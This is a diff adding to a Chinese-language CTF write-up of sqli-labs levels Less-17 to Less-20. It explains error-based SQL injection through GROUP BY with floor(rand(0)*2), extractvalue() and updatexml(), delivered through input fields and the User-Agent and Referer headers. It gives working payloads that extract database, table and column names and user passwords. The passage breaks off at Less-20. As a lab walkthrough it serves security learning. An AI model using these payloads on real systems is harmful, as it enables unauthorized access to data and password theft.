@@ -590,6 +590,117 @@ group by报错注入相较于其他几个报错注入有一定难度，下面作
 
 这里将student表根据"id"进行分组，通过count可以知道总共有13条查询结果。下面通过分析group by的原理来探讨一下为什么会出现这种情况
 
-- 使用id进行group by分组时，会依次取出表中的每个记录并创建一个临时表，表中有两个字段，一个是id，另一个则是count。group by后面的字段就是该表的主键，每取出一个结果，如果临时表里已经拥有了该主键，那么count + 1，如果临时表中不存在该主键，则将该主键插入到临时表中。现在模拟一下使用id进行分组，字段id下的值作为主键，首先取得第一条结果，结果中有主键字段，临时表中没有主键01，则插入这条结果；然后取得第二条结果，结果中有主键字段，临时表中没有主键02，则插入这条结果......以此类推，13条结果的id都不一样，则分组的结果也会是13条。
+- 使用id进行group by分组时，会依次取出表中的每个记录并创建一个临时表，表中有两个字段，一个是id，另一个则是count。group by后面的字段就是该表的主键，每取出一个结果，如果临时表里已经拥有了该主键，那么count + 1，如果临时表中不存在该主键，则将该主键插入到临时表中。现在模拟一下使用id进行分组，字段id下的值作为主键，首先取得第一条结果，结果中有主键字段，临时表中没有主键01，则插入这条结果；然后取得第二条结果，结果中有主键字段，临时表中没有主键02，则插入这条结果......以此类推，13条结果的id都不一样，则分组的结果也会是13条
+
+- 使用"id"进行group by分组时，会直接将"id"字符串作为主键插入到临时表中，每次获取结果时，"id"主键一定存在，因此每条结果都会让count + 1，最后分组结果为1条
+
+**报错注入**
+
+```sql
+select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2));
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/WT]W}@_}7RKD)XPH5$W$G]8.png?raw=true">
+
+**原理分析**
+
+先来模拟查询，从 `information_schema.tables` 中查询所有结果的条数，按照 `database() + floor(rand(0)*2)` 的条件进行分组。先进行第一次查询，执行 `concat(database(),floor(rand(0)*2))` ，结果为test0（数据库名 + floor(rand(0)*2))第一次的值，依次为011011...），将test0与临时表中的主键对比，不存在，则再次执行 `concat(database(),floor(rand(0)*2))` ，得到结果为test1，将test1插入到临时表中作为主键；然后进行第二次查询，同样先执行 `concat(database(),floor(rand(0)*2))` ，结果为test1，与临时表作对比，临时表中存在test1主键；进行第三次查询，执行 `concat(database(),floor(rand(0)*2))` ，结果为test0，与临时表作对比，临时表中不存在test0主键，则再次执行 `concat(database(),floor(rand(0)*2))` ，得到的结果为test1，将test1插入到表中作为主键，但是此时临时表中已经存在test1主键，报错主键冲突，将需要的信息携带出来
+
+下面回到原题进行报错注入，先查询数据库
+
+```sql
+1' and (select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2)))#
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/6EGYL1FOE$PB3PSI3GG3(VK.png?raw=true">
+
+确定数据库为security，挨个查询表
+
+```sql
+1' and (select count(*) from information_schema.tables group by concat((select table_name from information_schema.tables where table_schema='security' limit 0,1),floor(rand(0)*2)))#
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/CV7KX(9M}Y9Z7E4N0PL56Y8.png?raw=true">
+
+*注：需要查询其他表修改limit即可*
+
+确定表为users，挨个查询字段
+
+```sql
+1' and (select count(*) from information_schema.columns group by concat((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),floor(rand(0)*2)))#
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/KXB_YLBP7H7U1%E1C~]MC}N.png?raw=true">
+
+查询字段内容（Mistaken）
+
+```sql
+1' and (select count(*) from information_schema.columns where table_schema=database() group by concat((select password from security.users limit 0,1),floor(rand(0)*2)))#
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/DU48RZSR2$Y0ROD[P_[`9}P.png?raw=true">
+
+报错，因为mysql不支持查询和更新是一张表，所以我们需要一张中间表
+
+查询字段内容（Fixed）
+
+```sql
+1' and (select 1 from(select count(*) from information_schema.columns where table_schema=database() group by concat((select password from security.users limit 0,1),'<-password',floor(rand(0)*2)))a)#
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/F`5~K7`FDIQF4A{`ZFKC]UQ.png?raw=true">
+
+*注：在使用了中间表后，必须使用别名才能使用*
 
 ### Less-18
+
+输入正确的用户名和密码，页面会显示User Agent，判断User Agent处可能存在sql语句，进行抓包，在User Agent后面添加一个单引号
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/)F@HT{4O}{WY9I[Q9OE]563.png?raw=true">
+
+页面出现报错，推测正确，根据报错，User Agent处有三个变量，分别是'User Agent'，'IP'和'Username'，尝试构造攻击语句，这里注意，admin后面还有一个括号
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/EO2J6_64%1G{VLMOEL%I8`C.png?raw=true">
+
+报错消失，开始报错注入，这里我使用extractvalue()
+
+```sql
+1',2,(extractvalue(1,concat(0x5c,version()))) )#
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/TCASWI8GDM}PNDF(TPXE2XS.png?raw=true">
+
+以下步骤省略
+
+### Less-19
+
+这次显示的是Referer
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/5W@DVLN0$5VZ41V{W){SZXR.png?raw=true">
+
+同样抓包加单引号
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/3{[F~5[[MI}$BU$4CETGP0N.png?raw=true">
+
+这次只有两个变量，'Referer'和'IP'，但是后面同样有个括号，开始构建攻击语句
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/}]NCYH`9NZBABQOT6UFH%2G.png?raw=true">
+
+报错消失，进行报错注入，使用updatexml()
+
+```sql
+1',(updatexml(1,concat(0x5c,version()),1)) )#
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/T9HH(MG7@{0`[GYTLR1DH[O.png?raw=true">
+
+以下步骤省略
+
+### Less-20
+
+这次显示的是cookie
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/QE1OBSWA%2XU86)9F_AQN~B.png?raw=true">
+
+抓包加单引号
+
